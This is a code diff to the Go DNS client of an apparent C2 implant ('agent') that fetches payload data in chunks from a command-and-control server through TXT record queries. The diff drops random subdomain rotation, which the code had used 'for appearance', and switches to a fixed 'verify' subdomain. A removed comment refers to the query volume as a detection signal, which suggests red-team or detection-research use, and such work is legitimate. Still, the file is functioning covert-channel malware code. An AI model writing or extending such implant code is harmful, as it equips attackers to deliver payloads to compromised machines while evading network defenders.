@@ -8,17 +8,19 @@
 //
 // TXT record queries (payload transfer):
 //   - ALWAYS query C2 server directly, regardless of DirectMode
-//   - This bypasses resolver caching (we reuse subdomains)
-//   - The high volume of TXT queries is the detection signal, not the path
+//   - This bypasses resolver caching
+//   - Uses fixed subdomain "verify" (no rotation needed for direct queries)
 package dns
 
 import (
 	"fmt"
-	"github.com/miekg/dns"
-	"motd_joker_screenmate/internal/protocol"
 	"net"
 	"strings"
 	"time"
+
+	"github.com/miekg/dns"
+
+	"motd_joker_screenmate/internal/protocol"
 )
 
 // Client handles DNS queries for the agent.
@@ -107,15 +109,15 @@ func (c *Client) QueryA() (net.IP, bool, error) {
 // QueryTXT sends a TXT record query and returns the response text.
 // ALWAYS queries C2 directly (bypasses resolver caching).
 // Uses txtTarget regardless of DirectMode setting.
+// Uses fixed subdomain "verify" since we're querying C2 directly (no caching concern).
 //
 // Returns:
 //   - txt: The TXT record value (contains sequence + base64 data)
 //   - isEmpty: True if empty TXT (signals end of transfer)
 //   - err: Any error that occurred
 func (c *Client) QueryTXT() (string, bool, error) {
-	// Select random subdomain (still rotate for appearance)
-	subdomain := protocol.RandomSubdomain()
-	fqdn := subdomain + "." + c.domain
+	// Fixed subdomain for TXT queries - no need to rotate since we query C2 directly
+	fqdn := "verify." + c.domain
 
 	// Create DNS message
 	msg := new(dns.Msg)
